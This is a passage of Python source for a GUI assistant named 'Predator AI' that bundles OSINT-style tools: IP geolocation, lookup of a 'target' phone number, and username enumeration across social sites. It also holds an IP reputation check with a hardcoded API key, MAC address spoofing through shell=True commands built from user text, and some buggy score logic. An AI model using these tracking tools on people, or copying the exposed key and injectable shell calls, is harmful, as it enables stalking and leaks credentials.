                      return aiRes(usrmsg, f"\n-| IP: {ip}\n-| Type: {typex}\n-| Country: {country}\n-| Code: {country_code}\n-| City: {city}\n-| Continent: {continent}\n-| Continent Code: {continent_code}\n-| Region: {region}\n-| Region Code: {region_code}\n-| Latitude: {latitude}\n-| Longitude: {longitude}\n==========================\n-| Maps: https://www.google.com/maps/@{lat},{lon},8z\n-| EU: {is_eu}\n-| Postal: {postal}\n-| Calling Code: {calling_code}\n-| Capital: {capital}\n-| Borders: {borders}\n-| Country Flag: {flage}\n-| ASN: {coonx}\n-| ORG: {orgx}\n-| ISP: {isp}\n-| Domain: {domainx}\n-| ID: {idx}\n-| ABBR: {abbr}\n-| DST: {dst}\n-| Offset: {offset}\n-| UTC: {utcx}\n-| Current Time: {currtime}")
                  
                    
                    IP_Track()

                  except Exception as err:
                    console.print_exception(show_locals=True)
                    return aiRes(usrmsg, err)

                elif input_user == '3': #OPSI 2
                  
                  
                  def phoneGW():
                    
                    User_phone = customtkinter.CTkInputDialog(text="Enter phone number target \nEx [+2126xxxxxxxxx]", title="GhostTrack").get_input()
                    
                    if User_phone == "Cancel":
                      return
                    
                    if "+" in User_phone:
                      pass
                    else:
                      User_phone = f"+{User_phone}"
                    
                    default_region = "ID"

                    parsed_number = phonenumbers.parse(User_phone, default_region) # VARIABLE PHONENUMBERS
                    region_code = phonenumbers.region_code_for_number(parsed_number)
                    jenis_provider = carrier.name_for_number(parsed_number, "en")
                    location = geocoder.description_for_number(parsed_number, "id")
                    is_valid_number = phonenumbers.is_valid_number(parsed_number)
                    is_possible_number = phonenumbers.is_possible_number(parsed_number)
                    formatted_number = phonenumbers.format_number(parsed_number, phonenumbers.PhoneNumberFormat.INTERNATIONAL)
                    formatted_number_for_mobile = phonenumbers.format_number_for_mobile_dialing(parsed_number, default_region, with_formatting=True)
                    number_type = phonenumbers.number_type(parsed_number)
                    timezone1 = timezone.time_zones_for_number(parsed_number)
                    timezoneF = ', '.join(timezone1)

                    aiRes(usrmsg, f"           ========== LOADIND ==========")
                    blabla = phonenumbers.format_number(parsed_number, phonenumbers.PhoneNumberFormat.E164)
                    aiRes(usrmsg, f"-| Location: {location}\n-| Region Code: {region_code}\n-| Timezone: {timezoneF}\n-| Operator: {jenis_provider}\n-| Valid number: {is_valid_number}\n-| Possible number: {is_possible_number}\n-| International format: {formatted_number}\n-| Mobile format: {formatted_number_for_mobile}\n-| Original number: {parsed_number.national_number}\n-| E.164 format: {blabla}\n-| Country code: {parsed_number.country_code}\n-| Local number: {parsed_number.national_number}")
                    
                    if number_type == phonenumbers.PhoneNumberType.MOBILE:
                      return aiRes(usrmsg, f"Type: This is a mobile number")
                    elif number_type == phonenumbers.PhoneNumberType.FIXED_LINE:
                      return aiRes(usrmsg, f"Type: This is a fixed-line number")
                    else:
                      return aiRes(usrmsg, f"Type: This is another type of number")
                
                  try:    
                    return phoneGW()
                  except Exception as err:
                    console.print_exception(show_locals=True)
                    return aiRes(usrmsg, err)
                    
                elif input_user == '2': #OPSI 3
                  
                  def showIP():
                    respone = requests.get('https://api.ipify.org/')
                    Show_IP = respone.text
                    return aiRes(usrmsg, f"========== YOUR IP ==========\n{Show_IP}\n========== YOUR IP ==========")
                    
                  try:
                    return showIP()
                  except Exception as err:
                    console.print_exception(show_locals=True)
                    return aiRes(usrmsg, err)

                elif input_user == '4':
              
                  try:
                    def TrackLu(username):
                      results = {}
                      social_media = [
                      {"url": "https://www.facebook.com/{}", "name": "Facebook"},
                      {"url": "https://www.twitter.com/{}", "name": "Twitter"},
                      {"url": "https://www.instagram.com/{}", "name": "Instagram"},
                      {"url": "https://www.linkedin.com/in/{}", "name": "LinkedIn"},
                      {"url": "https://www.github.com/{}", "name": "GitHub"},
                      {"url": "https://www.pinterest.com/{}", "name": "Pinterest"},
                      {"url": "https://www.tumblr.com/{}", "name": "Tumblr"},
                      {"url": "https://www.youtube.com/{}", "name": "Youtube"},
                      {"url": "https://soundcloud.com/{}", "name": "SoundCloud"},
                      {"url": "https://www.snapchat.com/add/{}", "name": "Snapchat"},
                      {"url": "https://www.tiktok.com/@{}", "name": "TikTok"},
                      {"url": "https://www.behance.net/{}", "name": "Behance"},
                      {"url": "https://www.medium.com/@{}", "name": "Medium"},
                      {"url": "https://www.quora.com/profile/{}", "name": "Quora"},
                      {"url": "https://www.flickr.com/people/{}", "name": "Flickr"},
                      {"url": "https://www.periscope.tv/{}", "name": "Periscope"},
                      {"url": "https://www.twitch.tv/{}", "name": "Twitch"},
                      {"url": "https://www.dribbble.com/{}", "name": "Dribbble"},
                      {"url": "https://www.stumbleupon.com/stumbler/{}", "name": "StumbleUpon"},
                      {"url": "https://www.ello.co/{}", "name": "Ello"},
                      {"url": "https://www.producthunt.com/@{}", "name": "Product Hunt"},
                      {"url": "https://www.snapchat.com/add/{}", "name": "Snapchat"},
                      {"url": "https://www.telegram.me/{}", "name": "Telegram"},
                      {"url": "https://www.weheartit.com/{}", "name": "We Heart It"}
                      ]

                      for site in social_media:
                        try:
                          url = site['url'].format(username)
                          response = requests.get(url)
                          if response.status_code == 200:
                            results[site['name']] = url
                          else:
                            results[site['name']] = (f"Username not found!")
                        except Exception as err:
                            console.print_exception(show_locals=True)
                            aiRes(usrmsg, f"{site} > {err}")

                      return results
                    
                    username = customtkinter.CTkInputDialog(text="Enter Username", title="GhostTrack").get_input()
                      
                    if username == "Cancel":
                      return

                    aiRes(usrmsg, f"           ========== LOADIND ==========")
                    results = TrackLu(username)
                    return aiRes(usrmsg, results)
                    # for site, url in results.items():
                    #     print(f" {Wh}[ {Gr}+ {Wh}] {site} : {Gr}{url}")
                  except Exception as err:
                    console.print_exception(show_locals=True)
                    return aiRes(usrmsg, err)

                
                else:
                  return aiRes(usrmsg, "Oops no option !")

              return GhostTrack(usrop)

            elif usrmsg == "restart os" or usrmsg == "r.os":
              msg = CTkMessagebox(title=f"permission required for [{usrmsg}]", message="are you sure?",
                        icon="question", option_1="Cancel", option_2="No", option_3="Yes")
              response = msg.get()
              
              if response=="Yes":
                pass
              else:
                return

              try:
                subprocess.call(["shutdown", "/r"])
              except Exception as err:
                console.print_exception(show_locals=True)
                return aiRes(usrmsg, f"[{usrmsg}] FAILURE: {err}")
              
              return aiRes(usrmsg, f"[{usrmsg}] DONE")

            elif usrmsg == 'empty rb' or usrmsg == "e.rb":
              msg = CTkMessagebox(title=f"permission required for [{usrmsg}]", message="are you sure?",
                        icon="question", option_1="Cancel", option_2="No", option_3="Yes")
              response = msg.get()
              
              if response=="Yes":
                pass
              else:
                return

              try:
                winshell.recycle_bin().empty(confirm = False, show_progress = False, sound = True)
              except Exception as err:
                console.print_exception(show_locals=True)
                return aiRes(usrmsg, f"[{usrmsg}] FAILURE: {err}")

              return aiRes(usrmsg, f"[{usrmsg}] DONE")

            elif usrmsg == "ip.m":
              try:
                request = requests.get('https://api.myip.com')
                response = json.loads(request.text)
                # ip = (response["ip"])
                return aiRes(usrmsg, response)
              except Exception as err:
                return aiRes(usrmsg, err)
            
            elif 'ip.l ' in usrmsg:
              targetip = usrmsg.replace('ip.l ', '')

              def checkIP(syA1):
                try:
                  aiRes(usrmsg, f"[*] Running Reputation Check Against: {syA1}")
                  querystring = {'ipAddress': syA1,'maxAgeInDays': '90'}
                  headers = {'Accept': 'application/json', 'Key': '58878ed65228db88eddfda4983bce5d19d425ddf81f427857b3f59f11aecc34f127862a1cc7d4581'}
                  response = requests.request(method='GET', url='https://api.abuseipdb.com/api/v2/check', headers=headers, params=querystring)
                  # Formatted output
                  decodedResponse = json.loads(response.text)    
                  
                  x1 = json.dumps(decodedResponse ["data"]["domain"])
                  x2 = json.dumps(decodedResponse ["data"]["hostnames"])
                  x3 = json.dumps(decodedResponse ["data"]["usageType"])
                  x4 = json.dumps(decodedResponse ["data"]["abuseConfidenceScore"])
                  x5 = json.dumps(decodedResponse ["data"]["totalReports"])
                  x6 = json.dumps(decodedResponse ["data"]["lastReportedAt"])
                  x7 = json.dumps(decodedResponse ["data"]["isWhitelisted"])

                  aiRes(usrmsg, f"Domain: {x1}\nHostname: {x2}\nUsage Type: {x3}\nConfidence of Abuse: {x4}\nNumber Times of Reported: {x5}\nLast Reported: {x6}\nWhitelisted: {x7}")
          

                    #This conditional statement outputs the status of the ip address based on abuse of confidence
                  try:
                    if json.dumps(decodedResponse ["data"]["abuseConfidenceScore"]) == "100":
                      aiRes(usrmsg, f"The IP Address {sys.argv[1]} Is Malicious and well known for SSH Bruteforce Attacks")
                    elif json.dumps(decodedResponse ["data"]["abuseConfidenceScore"]) == "0":
                      aiRes(usrmsg, f"The IP Address {sys.argv[1]} Is Not Malicious")
                    elif json.dumps(decodedResponse ["data"]["abuseConfidenceScore"]) < "20":
                      aiRes(usrmsg, f"The IP Address {sys.argv[1]} Is Probably Not Malicious But Should Be Investigated Further")
                    elif json.dumps(decodedResponse ["data"]["abuseConfidenceScore"]) <= "20":
                      aiRes(usrmsg, f"The IP Address {sys.argv[1]} Is Probably Malicious And Should Be Investigated Further")
                    else:
                      aiRes(usrmsg, f"[*] IP Reputation Look up Complete!!!")

                  except:
                    pass

                  return aiRes(usrmsg, "[*] IP Reputation Look up Complete!!!")
                except Exception as err:
                  console.print_exception(show_locals=True)
                  return aiRes(usrmsg, err)


              checkIP(targetip)

            elif 'g.pwd' in usrmsg or 'gen pwd' in usrmsg:
              
              def get_random_string(length):
                letters = string.ascii_lowercase
                result_str = ''.join(Xchoice(letters) for i in range(length))
                return result_str

              lenx = usrmsg.replace('g.pwd ', '').replace('gen pwd ', '').replace('g.pwd', '').replace('gen pwd', '')

              if lenx == '':
                return aiRes(usrmsg, f"[{usrmsg}] USAGE: g.pwd 16")

              lenz = int(lenx)

              try:
                aiRes(usrmsg, get_random_string(lenz))    
              except Exception as err:
                console.print_exception(show_locals=True)
                return aiRes(usrmsg, f"[{usrmsg}] Exception: {err}")

            elif usrmsg == 'faker':
              fake = Faker()

              XoUt = f"name: {fake.name()}\nemail: {fake.email()}\ncountry: {fake.country()}\njob: {fake.job()}\nssn: {fake.ssn()}\naddress: {fake.address()}"
            
              return aiRes(usrmsg, XoUt)

            elif usrmsg == 'ch.mac' or usrmsg == 'change mac':

              msg = CTkMessagebox(title=f"Type?", message="Select MAC Type",
                        icon="question", option_1="Cancel", option_2="Wifi", option_3="Ehernet")
              response = msg.get()
              
              connection = "wlan0"

              if response=="Ehernet":
                connection = "eth0"
              elif response=="Wifi":
                connection = "wlan0"

              else:
                return 
              
              usrmac = usrmsg.replace('ch.mac ', '').replace('change mac ', '').replace('ch.mac', '').replace('change mac', '')

              if usrmac == "":
                new_mac = rstr.xeger(r'00:[0-9A-F]\d:[0-9A-F]\d:[0-9A-F]\d:[0-9A-F]\d:[0-9A-F]\d')
              else:
                new_mac = usrmac

              subprocess.call("ifconfig " + connection, shell=True)
              subprocess.call("ifconfig " + connection +" down", shell=True)
              subprocess.call("ifconfig " + connection +" hw ether "+new_mac, shell=True)
              subprocess.call("ifconfig " + connection +" up", shell=True)
              subprocess.call("ifconfig " + connection, shell=True)

              return aiRes(usrmsg, f"MAC Changed to: {new_mac}")

            elif usrmsg == 'netx' or usrmsg == 'netxplorer':
              bot = threading.Thread(target=NetXplorer)
              bot.daemon = True
              bot.start()

              return
            
            elif usrmsg == 'hashtype':
              
              msg = CTkMessagebox(title=f"Type?", message="Select your Mode",icon="question", option_1="hash", option_2="file", option_3="dir")
              response = msg.get()
              
              if response=="hash":
                usrhash = customtkinter.CTkInputDialog(text="hash:", title="Enter your hash").get_input()
                resultX = Decrypter(f'{usrhash}|null|null|5')
                return aiRes(usrmsg, f"result: {resultX}")
              
              elif response=="file":
                usrfile = filedialog.askopenfilename()
                resultX = Decrypter(f'null|{usrfile}|null|5')
                return aiRes(usrmsg, f"result: {resultX}")

              elif response=="dir":
                usrdir = customtkinter.CTkInputDialog(text="dir:", title="Enter your directory").get_input()
                resultX = Decrypter(f'null|null|{usrdir}|5')
                return aiRes(usrmsg, f"result: {resultX}")

              
            elif "who made you" in usrmsg or "who created you" in usrmsg or "creator of you" in usrmsg or "your creator" in usrmsg or "who develop you" in usrmsg or "your developer" in usrmsg or "your maker" in usrmsg:
              return aiRes(usrmsg, f"I have been created by mr0x01")

            elif "about you" in usrmsg:
              return aiRes(usrmsg, "I am an AI-powered language model developed by mr0x01, known as Predator AI. My purpose is to assist and provide information And Be Your personal assistant, created to provide dedicated support and assistance. It Took 3 Days To Build Me.")

            
            return aiRes(usrmsg, 0)

        def copyfunc(msg):
            pyperclip.copy(msg)

        def ChatEvent_trigger():
            bot = threading.Thread(target=ChatEvent)
            bot.daemon = True
            bot.start()

        self.title("Predator AI [BETA]")
        self.iconbitmap('core/logo.ico')
        ico = Image.open('core/logo.png')
        mainico = ImageTk.PhotoImage(ico)
        self.wm_iconphoto(False, mainico) 
        self.geometry("720x480")
        self.attributes("-topmost", True)

        self.grid_rowconfigure((0), weight=1)
        self.grid_columnconfigure((0), weight=1)

        self.chat_frame = customtkinter.CTkScrollableFrame(self, width=650, height=380)
        self.chat_frame.grid(row=0, column=0, sticky="nsew")
        # self.chat_frame.place(relx=0.5, rely=0.45, anchor=customtkinter.CENTER)
        self.chat_frame_switches = []

        self.BotIcon = customtkinter.CTkLabel(self.chat_frame, text="", image=ai_icon)
        self.BotIcon.pack(padx=1, pady=1)
        self.chat_frame_switches.append(self.BotIcon)

        # self.IntroMsg = customtkinter.CTkLabel(self.chat_frame, corner_radius=10, text="how i can help you sir?")
        # self.IntroMsg.pack()
        self.IntroMsg = customtkinter.CTkTextbox(self.chat_frame, corner_radius=10, width=300, height=30)
        self.IntroMsg.insert("0.0", "Welcome to Predator AI")
        self.IntroMsg.pack(padx=1, pady=1, anchor=customtkinter.CENTER)
        self.chat_frame_switches.append(self.IntroMsg)

        self.msg_entry = customtkinter.CTkEntry(self, width=300)
        # self.msg_entry.place(relx=0.3, rely=0.9)
        self.msg_entry.grid(row=1, column=0, padx=(10, 10), pady=(10, 10), sticky="nsew")
        self.msg_entry.bind("<Return>", lambda e:ChatEvent_trigger())

        # self.submitBtn = customtkinter.CTkButton(master=self, text="Submit", command=ChatEvent_trigger)
        # # self.submitBtn.place(relx=0.88, rely=0.95, anchor=customtkinter.CENTER)
        # self.submitBtn.grid(row=2, column=0, sticky="nsew")

        def_values = ["python","tkinter","customtkinter","widgets","options","menu","combobox","dropdown","search"]

        CTkScrollableDropdown(self.msg_entry, values=def_values, command=lambda e: self.msg_entry.insert(1, e), autocomplete=True) # Using autocomplete

class NetXplorer(customtkinter.CTkToplevel):
    def __init__(self):
        super().__init__()

        # configure window
        self.title("NetXplorer - Network Analysis Tool")
        self.geometry(f"{750}x{480}")
        self.attributes("-topmost", True)
        self.grid_rowconfigure(3, weight=1)
        self.grid_columnconfigure(0, weight=1)
        
        # host frame
        self.frame_hostinfo = customtkinter.CTkFrame(self, width=730, corner_radius=10)
        self.frame_hostinfo.grid(row=0, column=0, padx=(10, 10), pady=(10, 10), sticky="nsew")
        self.frame_hostinfo.grid_rowconfigure(1, weight=1)
        self.frame_hostinfo.grid_columnconfigure(4, weight=1)
        # host name entry
        self.entry = customtkinter.CTkEntry(self.frame_hostinfo, placeholder_text="Host name", width=300)
        self.entry.grid(row=0, column=0, padx=(10, 0), pady=(10, 10), sticky="nsew")
        # optionemenu
        self.actions = ["Ping", "IP Info", "Resolve IP"]
        self.optionemenu_action = customtkinter.CTkOptionMenu(self.frame_hostinfo, values=self.actions)
        self.optionemenu_action.grid(row=0, column=2, padx=(10, 0), pady=(10, 10), sticky="nsew")
        # action button
        self.button_action = customtkinter.CTkButton(master=self.frame_hostinfo, text="GO", border_width=2, text_color=("gray10", "#DCE4EE"), command=self.perform_action)
        self.button_action.grid(row=0, column=3, padx=(10, 0), pady=(10, 10), sticky="nsew")
        # checkbox
        self.clear_text_var = customtkinter.IntVar()
        self.checkbox_clear = customtkinter.CTkCheckBox(master=self.frame_hostinfo, text="Clear Text", variable=self.clear_text_var)
        self.checkbox_clear.grid(row=0, column=4, padx=(10, 10), pady=(10, 10), sticky="nsew")
        
        # textbox
        self.textbox = customtkinter.CTkTextbox(self, wrap=customtkinter.WORD, height=350)
        self.textbox.grid(row=1, column=0, padx=(10, 10), pady=(0, 10), sticky="nsew")
        
        # button frame
        self.frame_buttons = customtkinter.CTkFrame(self, width=730, corner_radius=10)
        self.frame_buttons.grid(row=2, column=0, padx=(10, 10), pady=(0, 10), sticky="nsew")
        self.frame_buttons.grid_rowconfigure(1, weight=1)
        self.frame_buttons.grid_columnconfigure(2, weight=1)
        self.button_system_info = customtkinter.CTkButton(master=self.frame_buttons, width=230, fg_color="transparent", border_width=2, text="Show System Information", command=self.show_system_info)
        self.button_system_info.grid(row=0, column=0, padx=(10, 0), pady=(10, 10), sticky="nsew")
        self.button_connections = customtkinter.CTkButton(master=self.frame_buttons, width=230, fg_color="transparent", border_width=2, text="Show Connections", command=self.show_connections)
        self.button_connections.grid(row=0, column=1, padx=(10, 0), pady=(10, 10), sticky="nsew")
        self.button_monitor_traffic = customtkinter.CTkButton(master=self.frame_buttons, width=230, fg_color="transparent", border_width=2, text="Monitor Traffic (5s)", command=lambda: threading.Thread(target=self.monitor_traffic, daemon=True).start())
        self.button_monitor_traffic.grid(row=0, column=2, padx=(10, 10), pady=(10, 10), sticky="nsew")

        # set default values
        self.checkbox_clear.select()


    def perform_action(self):
        if self.clear_text_var.get():
            self.textbox.delete(1.0, customtkinter.END)
        input_value = self.entry.get()
        if self.optionemenu_action.get() == "Ping":
            self.ping_host(input_value)
        elif self.optionemenu_action.get() == "IP Info":
            self.get_ip_info(input_value)
        elif self.optionemenu_action.get() == "Resolve IP":
            self.resolve_ip(input_value)


    def ping_host(self, host):
        response = subprocess.run(["ping", "-c", "4", host], stdout=subprocess.PIPE)
        self.textbox.insert(customtkinter.END, response.stdout.decode())

    def get_ip_info(self, host):
        try:
            ip_address = socket.gethostbyname(host)
            self.textbox.insert(customtkinter.END, f"IP address of {host}: {ip_address}\n")
        except socket.gaierror:
            self.textbox.insert(customtkinter.END, f"Unable to resolve {host}.\n")

    def resolve_ip(self, ip_to_resolve):
        try:
            host_name = socket.gethostbyaddr(ip_to_resolve)
            self.textbox.insert(customtkinter.END, f"Hostname for {ip_to_resolve}: {host_name[0]}\n")
        except socket.herror:
            self.textbox.insert(customtkinter.END, f"Unable to resolve {ip_to_resolve}.\n")


    def show_system_info(self):
        if self.clear_text_var.get():
            self.textbox.delete(1.0, customtkinter.END)
        uname_info = platform.uname()
        cpu_count = psutil.cpu_count(logical=False)
        virtual_memory = psutil.virtual_memory()
        self.textbox.insert(customtkinter.END, f"System: {uname_info.system}\n")
        self.textbox.insert(customtkinter.END, f"Release: {uname_info.release}\n")
        self.textbox.insert(customtkinter.END, f"Machine: {uname_info.machine}\n")
        self.textbox.insert(customtkinter.END, f"Processor: {uname_info.processor}\n")
        self.textbox.insert(customtkinter.END, f"CPU cores: {cpu_count}\n")
        self.textbox.insert(customtkinter.END, f"Total RAM: {virtual_memory.total >> 20} MB\n")

    def show_connections(self):
        if self.clear_text_var.get():
            self.textbox.delete(1.0, customtkinter.END)
        connections = psutil.net_connections(kind='inet')
        for conn in connections:
            self.textbox.insert(customtkinter.END, f"Protocol: {conn.type} Address: {conn.laddr} Status: {conn.status}\n")

    def monitor_traffic(self):
        if self.clear_text_var.get():
            self.textbox.delete(1.0, customtkinter.END)
        initial_counts = psutil.net_io_counters()
        time.sleep(5)
        final_counts = psutil.net_io_counters()
        sent_bytes = final_counts.bytes_sent - initial_counts.bytes_sent
        recv_bytes = final_counts.bytes_recv - initial_counts.bytes_recv
        self.textbox.insert(customtkinter.END, f"Sent: {sent_bytes} bytes, Received: {recv_bytes} bytes in the last 5 seconds.\n")

if __name__ == "__main__":
    app = Predator()
    app.run()
    

